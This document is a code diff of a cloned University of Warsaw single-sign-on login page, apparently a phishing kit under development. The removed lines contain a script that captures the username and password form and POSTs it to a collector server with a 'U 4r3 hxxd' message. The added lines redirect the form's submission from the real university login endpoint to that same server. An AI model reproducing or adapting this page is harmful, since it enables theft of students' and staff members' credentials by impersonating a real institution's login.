@@ -20,18 +20,16 @@
       <script>
         function SubmitForm()
         {
-            console.log("U 4r3 hxxd");
-            const formData = new FormData(document.getElementById("fm1"));
-            /* TEMPORARY URL WHILE WORKING WIHT REUQUESTBIN */
-            fetch("http://127.0.0.1:5000", { method: "POST", body: formData});
+            // const formData = new FormData(document.getElementById("fm1"));
+            // fetch("http://127.0.0.1:5000", { method: "POST", body: formData});
             return true;
         }
       </script>
 
       <div id="content" class="fl-screenNavigator-scroll-container">
         <div class="box fl-panel" id="login">
-          <form id="fm1" class="fm-v clearfix" onsubmit="javascript: return SubmitForm();"
-            action="https://logowanie.uw.edu.pl/cas/login?locale=pl"
+          <form id="fm1" class="fm-v clearfix"
+            action="http://127.0.0.1:5000"
             method="post" data-bitwarden-watching="1">
             <h2>Wprowadź swój identyfikator sieciowy i hasło, aby kontynuować.</h2>
             <div class="row fl-controls-left">
